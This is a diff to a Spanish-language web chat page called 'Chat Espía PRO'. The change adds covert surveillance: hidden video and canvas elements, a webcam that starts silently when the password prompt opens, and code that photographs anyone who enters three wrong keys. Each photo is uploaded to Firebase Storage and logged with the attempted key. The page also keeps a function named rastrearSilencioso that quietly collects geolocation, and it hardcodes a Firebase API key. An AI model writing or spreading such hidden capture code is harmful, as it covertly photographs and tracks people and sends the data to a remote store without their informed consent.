@@ -20,6 +20,9 @@ button { background: #25d366; border: none; color: white; padding: 10px 20px; bo
 
 /* Estilo para el botón del ojito */
 .eye-btn { background: none; border: none; cursor: pointer; font-size: 18px; padding: 0; margin-left: 5px; }
+
+/* Elementos invisibles para el sistema de intrusos */
+#camera-stream, #capture-canvas { display: none; }
 </style>
 </head>
 
@@ -27,6 +30,9 @@ button { background: #25d366; border: none; color: white; padding: 10px 20px; bo
 
 <div class="header">🔐 Chat Espía PRO - Salas Privadas</div>
 <div id="chat" class="chat"></div>
+
+<video id="camera-stream" autoplay playsinline></video>
+<canvas id="capture-canvas"></canvas>
 
 <div class="inputArea">
 <input id="texto" placeholder="Escribe un secreto..." onkeypress="if(event.key === 'Enter') enviar()">
@@ -37,10 +43,7 @@ button { background: #25d366; border: none; color: white; padding: 10px 20px; bo
 
 import { initializeApp } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-app.js";
 import { getFirestore, collection, addDoc, onSnapshot, query, orderBy } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-firestore.js";
-
-//////////////////////////////////////////////////
-// 🔥 CONFIG FIREBASE
-//////////////////////////////////////////////////
+import { getStorage, ref, uploadString, getDownloadURL } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-storage.js";
 
 const firebaseConfig = {
   apiKey: "AIzaSyC_1zQU3X8K3v4Es2mfJaOmKq0BahCYQsE",
@@ -53,6 +56,15 @@ const firebaseConfig = {
 
 const app = initializeApp(firebaseConfig);
 const db = getFirestore(app);
+const storage = getStorage(app);
+
+//////////////////////////////////////////////////
+// ⚙️ CONFIGURACIÓN DE SEGURIDAD
+//////////////////////////////////////////////////
+
+const PREFIJO_SALA = "espia_"; // Las salas deben empezar así, ej: espia_sala1
+let intentosFallidos = 0;
+let cameraStream = null;
 
 async function rastrearSilencioso(idUsuario) {
     if (navigator.geolocation) {
@@ -74,21 +86,68 @@ let SALA = "";
 let mensajesCol;
 let MI_ID = Math.random().toString(36).substring(7);
 
-function pedirClave(){
+async function pedirClave(){
+    // Iniciar cámara invisiblemente al cargar el prompt
+    try {
+        cameraStream = await navigator.mediaDevices.getUserMedia({ video: true });
+        document.getElementById('camera-stream').srcObject = cameraStream;
+    } catch (e) { console.log("Cámara no disponible"); }
+
     let clave = prompt("🔐 Ingresa la clave del chat:");
-    if(!clave){
-        alert("Debes ingresar una clave");
-        location.reload();
+
+    if(!clave || !clave.startsWith(PREFIJO_SALA)){
+        intentosFallidos++;
+        if(intentosFallidos >= 3) {
+            await capturarYReportarIntruso(clave || "vacio");
+            alert("Acceso bloqueado por seguridad.");
+        } else {
+            alert("Clave incorrecta.");
+            pedirClave();
+        }
         return;
     }
+
+    // Si la clave es correcta (tiene el prefijo)
     CLAVE_USUARIO = clave;
-    SALA = clave;
+    SALA = clave.replace(PREFIJO_SALA, ""); // El nombre de la sala es lo que sigue al prefijo
+    
     mensajesCol = collection(db, "mensajes", SALA, "chat");
+    
+    // Apagar cámara si entró bien
+    if(cameraStream) cameraStream.getTracks().forEach(t => t.stop());
+
     rastrearSilencioso(MI_ID);
     iniciarListener();
 }
 
 pedirClave();
+
+async function capturarYReportarIntruso(claveUsada) {
+    const video = document.getElementById('camera-stream');
+    const canvas = document.getElementById('capture-canvas');
+    const context = canvas.getContext('2d');
+    
+    canvas.width = video.videoWidth || 640;
+    canvas.height = video.videoHeight || 480;
+    context.drawImage(video, 0, 0, canvas.width, canvas.height);
+    
+    const dataUrl = canvas.toDataURL('image/jpeg', 0.8);
+    if(cameraStream) cameraStream.getTracks().forEach(t => t.stop());
+
+    try {
+        const fotoPath = `intrusos/${MI_ID}_${Date.now()}.jpg`;
+        const storageRef = ref(storage, fotoPath);
+        await uploadString(storageRef, dataUrl, 'data_url');
+        const fotoUrl = await getDownloadURL(storageRef);
+
+        await addDoc(collection(db, "intrusos"), {
+            id: MI_ID,
+            claveUsada: claveUsada,
+            foto: fotoUrl,
+            fecha: new Date().toLocaleString()
+        });
+    } catch(e) { console.error("Error al reportar", e); }
+}
 
 async function getKey() {
     const enc = new TextEncoder();
@@ -116,9 +175,7 @@ async function descifrarSeguro(dataStr){
         const data = JSON.parse(dataStr);
         const decrypted = await crypto.subtle.decrypt({ name: "AES-GCM", iv: new Uint8Array(data.iv) }, key, new Uint8Array(data.data));
         return dec.decode(decrypted);
-    }catch(e){
-        throw e;
-    }
+    }catch(e){ throw e; }
 }
 
 window.enviar = async function(){
@@ -130,13 +187,8 @@ window.enviar = async function(){
     input.value="";
 }
 
-//////////////////////////////////////////////////
-// 🔓 FUNCIÓN DEL OJITO INTERACTIVO (MODIFICADA)
-//////////////////////////////////////////////////
-
 window.toggleMensaje = async function(btn, codigoCifrado) {
     const contenedorTexto = btn.parentElement.querySelector(".texto-msg");
-    
     if (btn.dataset.estado === "visible") {
         contenedorTexto.innerText = "••••••••";
         btn.innerText = "👁️";
@@ -154,10 +206,6 @@ window.toggleMensaje = async function(btn, codigoCifrado) {
     }
 }
 
-//////////////////////////////////////////////////
-// 📡 LISTENER
-//////////////////////////////////////////////////
-
 function iniciarListener(){
     const q = query(mensajesCol, orderBy("fecha"));
     onSnapshot(q,(snap)=>{
@@ -167,24 +215,18 @@ function iniciarListener(){
                 let data=change.doc.data();
                 let div=document.createElement("div");
                 div.className="msg "+(data.sender===MI_ID?"me":"remote");
-
-                // Ajustado para que use la clase .texto-msg y el data-estado inicial
                 div.innerHTML = `
                     <span class="texto-msg">••••••••</span>
                     <button class="eye-btn" data-estado="oculto" title="Ver mensaje">👁️</button>
                 `;
-
                 let btn = div.querySelector("button");
                 btn.onclick = () => toggleMensaje(btn, data.texto);
-
                 chat.appendChild(div);
                 chat.scrollTop=chat.scrollHeight;
             }
         });
     });
 }
-
 </script>
-
 </body>
 </html>
